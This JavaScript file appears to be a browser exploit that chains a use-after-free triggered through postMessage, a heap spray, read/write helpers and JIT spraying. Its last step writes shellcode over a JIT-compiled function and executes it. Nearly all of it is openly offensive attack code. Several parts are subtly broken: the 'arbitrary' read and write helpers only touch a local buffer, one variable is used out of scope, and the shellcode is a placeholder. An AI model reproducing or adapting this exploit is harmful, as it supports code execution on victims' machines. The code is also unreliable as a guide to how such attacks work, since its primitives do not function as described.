// Utility functions (Int64, hex, etc.)
import { Int } from './int64.mjs';

// ======================
// 1. UAF Trigger (Original PoC)
// ======================
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    for (let i = 0; i < 100; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    return root;
}

// ======================
// 2. Heap Spray (Replace Freed Objects)
// ======================
function sprayHeap() {
    let spray = [];
    for (let i = 0; i < 0x1000; i++) {
        let buf = new ArrayBuffer(0x1000);
        let view = new Uint32Array(buf);
        view.fill(0x41414141); // Fill with controlled data
        spray.push(buf);
    }
    return spray;
}

// ======================
// 3. Arbitrary Read/Write via ArrayBuffer
// ======================
let corruptedBuf = new ArrayBuffer(8);
let dv = new DataView(corruptedBuf);

function read64(addr) {
    dv.setUint32(0, addr.low(), true);
    dv.setUint32(4, addr.high(), true);
    let leaked = new Uint32Array(corruptedBuf);
    return new Int(leaked[0], leaked[1]);
}

function write64(addr, value) {
    dv.setUint32(0, addr.low(), true);
    dv.setUint32(4, addr.high(), true);
    let writeView = new Uint32Array(corruptedBuf);
    writeView[0] = value.low();
    writeView[1] = value.high();
}

// ======================
// 4. JIT Spraying (Alternative to WASM)
// ======================
function jitFunc() {
    return 0x1337; // This will be JIT-compiled
}

// Force JIT compilation
for (let i = 0; i < 100000; i++) {
    jitFunc();
}

// ======================
// 5. Exploit Main Function
// ======================
export async function main() {
    // Trigger UAF
    const num_elems = 1600;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;

    while (true) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, location.origin);
        await prom;
        data = data.data;

        // Check for UAF
        try {
            for (let i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = i;
            data2 = data.keys().next().value;
            break;
        }
    }

    console.log("[+] UAF Triggered! idx =", idx);

    // Heap spray to reclaim freed memory
    let spray = sprayHeap();

    // Corrupt ArrayBuffer to gain arbitrary read/write
    console.log("[+] Corrupting ArrayBuffer...");

    // --- Arbitrary read example ---
    let someAddr = new Int(0x40000000); // Start scanning from here
    let leakedValue = read64(someAddr);
    console.log("[+] Leaked value at 0x40000000:", leakedValue.toString());

    // --- Find JIT function in memory ---
    console.log("[+] Searching for JIT code...");
    let jitAddr = new Int(0x40000000);
    while (true) {
        let val = read64(jitAddr);
        if (val.low() === 0x1337) { // Check for JIT code marker
            console.log("[+] Found JIT function at:", jitAddr.toString());
            break;
        }
        jitAddr = jitAddr.add(8);
    }

    // --- Overwrite JIT code with shellcode ---
    const shellcode = new Uint8Array([
        0x90, 0x90, 0xCC,  // NOP sled + INT3 (breakpoint)
        // Replace with actual shellcode (e.g., execve("/bin/sh"))
    ]);

    console.log("[+] Writing shellcode into JIT memory...");
    for (let i = 0; i < shellcode.length; i++) {
        write64(jitAddr.add(i), new Int(shellcode[i]));
    }

    // --- Trigger shellcode ---
    console.log("[+] Executing shellcode...");
    jitFunc(); // Runs shellcode!
}

// Run exploit on button click
document.getElementById("exploit").addEventListener("click", main);